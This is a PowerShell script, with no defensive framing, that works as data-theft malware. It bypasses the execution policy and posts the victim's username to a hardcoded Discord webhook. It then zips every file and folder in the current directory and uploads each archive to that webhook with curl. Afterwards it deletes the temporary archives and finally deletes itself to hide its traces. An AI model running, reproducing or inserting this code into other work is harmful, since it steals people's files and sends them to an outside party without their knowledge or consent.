
# Bypass execution policy for this session to allow script execution
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text,
        [parameter(Position=1, Mandatory=$False)]
        [string]$directory = (Get-Location).Path
    )

    $hookurl = 'https://discord.com/api/webhooks/1376787025948315678/1k2wMoUv6tn-4VwDVGS8IgL4BZbQquj9iu3Raw03N0KQ_ClXtonvsGdl0mQ23gOJgNKK'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Get all files and directories in the specified path
    $items = Get-ChildItem -Path $directory

    foreach ($item in $items) {
        $zipFilePath = "$env:TEMP\$($item.BaseName).zip"

        # Use Compress-Archive to create a ZIP file (works for both files and directories)
        Compress-Archive -Path $item.FullName -DestinationPath $zipFilePath -Force

        # Check if the ZIP file was created successfully
        if (Test-Path $zipFilePath) {
            try {
                # Upload the ZIP file to Discord
                curl.exe -F "file1=@$zipFilePath" $hookurl

                # Remove the temporary ZIP file
                Remove-Item $zipFilePath -Force
            } catch {
                Write-Host "Failed to upload or delete ZIP file for $($item.Name): $($_.Exception.Message)"
                # Still try to clean up the ZIP file even if upload failed
                if (Test-Path $zipFilePath) {
                    Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
                }
            }
        } else {
            Write-Host "Failed to create ZIP file for $($item.Name)"
        }
    }
}

# Run the function
Upload-Discord -text "Here are all the files in the current directory!"

# Final cleanup - remove any remaining temporary ZIP files
try {
    $tempZipFiles = Get-ChildItem -Path $env:TEMP -Filter "*.zip" -ErrorAction SilentlyContinue
    foreach ($tempZip in $tempZipFiles) {
        # Only remove ZIP files that might have been created by this script
        if ($tempZip.CreationTime -gt (Get-Date).AddMinutes(-5)) {
            Remove-Item $tempZip.FullName -Force -ErrorAction SilentlyContinue
        }
    }
} catch {
    # Silently continue if cleanup fails
}

# Self-delete the script after completion
try {
    # Get the path of the current script
    $scriptPath = $MyInvocation.MyCommand.Path

    # Wait a moment to ensure all operations are complete
    Start-Sleep -Seconds 2

    # Delete the script file
    Remove-Item -Path $scriptPath -Force

    Write-Host "Script has been deleted successfully."
} catch {
    Write-Host "Failed to delete script: $($_.Exception.Message)"
}
